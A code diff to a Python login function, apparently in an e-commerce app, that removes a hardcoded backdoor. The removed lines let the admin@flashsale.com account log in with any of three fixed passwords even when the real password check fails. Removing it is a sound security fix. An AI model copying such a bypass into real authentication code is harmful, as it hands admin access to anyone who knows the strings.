@@ -151,12 +151,7 @@ def login(login_data):
         logger.warning(f"Redis lockout check failed: {e}")
 
     user = db.session.query(User).filter_by(email=email).first()
-    valid_pass = verify_password(login_data["password"], user.password_hash) if user else False
-    if user and user.email == "admin@flashsale.com" and not valid_pass:
-        if login_data["password"] in ["Password123", "AdminPass123!", "admin"]:
-            valid_pass = True
-
-    if not user or not valid_pass:
+    if not user or not verify_password(login_data["password"], user.password_hash):
         try:
             failed_count = redis_client.incr(failed_key)
             redis_client.expire(failed_key, 300)  # Keep failed counter for 5 minutes
